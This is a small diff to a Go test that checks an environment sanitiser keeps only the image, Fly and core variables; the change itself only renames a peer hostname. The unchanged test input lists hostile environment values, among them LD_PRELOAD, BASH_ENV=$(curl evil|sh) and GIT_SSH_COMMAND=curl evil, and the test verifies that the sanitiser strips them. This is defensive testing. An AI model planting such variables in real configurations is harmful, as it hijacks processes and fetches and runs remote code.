@@ -31,7 +31,7 @@ func TestCleanEnvKeepsOnlyTheImageFlyAndTheCore(t *testing.T) {
 	key := newKey().pub()
 	image := []string{"PATH=/home/claude/.local/bin:/usr/local/bin:/usr/bin:/bin", "NODE_PATH=/usr/lib/node_modules"}
 	started := []string{
-		coreKeyEnv + "=" + key, "JARVIS2_URL=http://jarvis2-box._peer.internal:8081", "FLY_MACHINE_ID=abc123", "FLY_REGION=lhr",
+		coreKeyEnv + "=" + key, "JARVIS2_URL=http://jarvis4-box._peer.internal:8081", "FLY_MACHINE_ID=abc123", "FLY_REGION=lhr",
 		// what a router or box could plant in a machine's config through a core that passes env on
 		"LD_PRELOAD=/tmp/x.so", "BASH_ENV=$(curl evil|sh)", "ENV=/tmp/x", "NODE_OPTIONS=--require /tmp/x.js", "PATH=/tmp/evil",
 		"PYTHONPATH=/tmp", "PYTHONSTARTUP=/tmp/x.py", "GIT_SSH_COMMAND=curl evil", "GIT_CONFIG_COUNT=1", "SSH_AUTH_SOCK=/tmp/s",
@@ -46,7 +46,7 @@ func TestCleanEnvKeepsOnlyTheImageFlyAndTheCore(t *testing.T) {
 		t.Fatal(err)
 	}
 	got := envMap(clean)
-	want := map[string]string{coreKeyEnv: key, "JARVIS2_URL": "http://jarvis2-box._peer.internal:8081", "FLY_MACHINE_ID": "abc123",
+	want := map[string]string{coreKeyEnv: key, "JARVIS2_URL": "http://jarvis4-box._peer.internal:8081", "FLY_MACHINE_ID": "abc123",
 		"FLY_REGION": "lhr", "PATH": "/home/claude/.local/bin:/usr/local/bin:/usr/bin:/bin", "NODE_PATH": "/usr/lib/node_modules",
 		"HOME": "/home/claude", "USER": "claude", "LOGNAME": "claude", "SHELL": "/bin/bash", "LANG": "C.UTF-8"}
 	if len(got) != len(want) {
